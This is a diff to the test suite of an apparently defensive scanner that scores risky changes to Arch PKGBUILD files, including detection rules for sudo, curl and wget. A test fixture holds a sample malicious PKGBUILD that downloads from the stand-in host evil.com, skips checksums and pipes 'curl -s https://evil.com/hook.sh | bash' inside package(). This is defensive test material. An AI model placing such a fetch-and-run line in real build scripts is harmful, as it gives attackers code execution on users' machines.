@@ -7,9 +7,9 @@ FULL_RULES = [
     {"id": "R006", "name": "Insecure Download Protocol", "pattern": r"https?://.*\.tar\.gz.*\|", "severity": "MEDIUM", "category": "network_execution", "match_target": "resolved"},
     {"id": "R007", "name": "Install File Modification", "pattern": r"\+.*\.install.*", "severity": "MEDIUM", "category": "installer", "match_target": "raw_line"},
     {"id": "R008", "name": "Unexpected File Download", "pattern": r"\b(python|ruby|perl)\s+-c\s+https?://", "severity": "HIGH", "category": "network_execution", "match_target": "resolved"},
-    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "resolved"},
-    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line"},
-    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line"},
+    {"id": "R009", "name": "Privilege Escalation", "pattern": r"\bsudo\b", "severity": "CRITICAL", "category": "privilege", "match_target": "raw_line", "scope": ["function_body"]},
+    {"id": "R010", "name": "Uses curl in PKGBUILD", "pattern": r"\bcurl\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
+    {"id": "R011", "name": "Uses wget in PKGBUILD", "pattern": r"\bwget\s", "severity": "LOW", "category": "network_usage", "match_target": "raw_line", "scope": ["function_body"]},
 ]
 
 
@@ -39,9 +39,10 @@ def test_pipeline_stage_integration():
 
     diff = """+source=("https://evil.com/payload.tar.gz")
 +sha256sums=('SKIP')
++package() {
 +  curl -s https://evil.com/hook.sh | bash
-+_helper="helper.sh"
-+  chmod +x $_helper"""
++  chmod +x $_helper
++}"""
 
     source_changes = extract_urls_from_diff(diff)
     assert "https://evil.com/payload.tar.gz" in source_changes.added_urls
@@ -67,6 +68,7 @@ def test_pipeline_stage_integration():
     score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
         url_first_seen_in_this_package=True,
         url_first_seen_globally=True,
+        observation_count=50,
     ), config)
     assert score > 50
     assert level in ("High", "Critical")
@@ -170,6 +172,58 @@ def test_pipeline_hard_to_spot_malicious():
     }
     score, breakdown, level = calculate_score(triggered, buckets, NoveltyContext(
         url_first_seen_globally=True,
+        observation_count=50,
     ), config)
     assert score == 35
     assert level == "Medium"
+
+
+# --- Structural anomaly tests (R014, R016) ---
+
+def test_pkgver_changed_detected():
+    from trustsight.analysis import _pkgver_changed_in_diff
+    diff = """-pkgver=1.0.0
++pkgver=2.0.0"""
+    assert _pkgver_changed_in_diff(diff)
+
+
+def test_pkgver_unchanged():
+    from trustsight.analysis import _pkgver_changed_in_diff
+    diff = """+pkgver=2.0.0"""
+    assert not _pkgver_changed_in_diff(diff)
+
+
+def test_url_changed_no_version_bump():
+    from trustsight.scoring import calculate_score
+    from trustsight.schema import NoveltyContext
+
+    triggered = [
+        {"rule_id": "R014", "name": "Source URL Changed Without Version Bump", "severity": "MEDIUM", "category": "integrity", "match": "URLs changed"},
+    ]
+    config = {
+        "severity_weights": {"MEDIUM": 15},
+        "source_bucket_weights": {},
+        "novelty_weights": {},
+    }
+    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
+    assert score == 15
+    assert level == "Low"
+    assert any(e.rule_id == "R014" for e in breakdown)
+
+
+def test_checksum_changed_no_url_change():
+    from trustsight.scoring import calculate_score
+    from trustsight.schema import NoveltyContext
+
+    triggered = [
+        {"rule_id": "R016", "name": "Checksum Changed Without Source Change", "severity": "HIGH", "category": "integrity", "match": "sha256sums changed"},
+    ]
+    config = {
+        "severity_weights": {"HIGH": 25},
+        "source_bucket_weights": {},
+        "novelty_weights": {},
+    }
+    score, breakdown, level = calculate_score(triggered, {}, NoveltyContext(), config)
+    assert score == 25
+    assert level == "Medium"
+    assert any(e.rule_id == "R016" for e in breakdown)
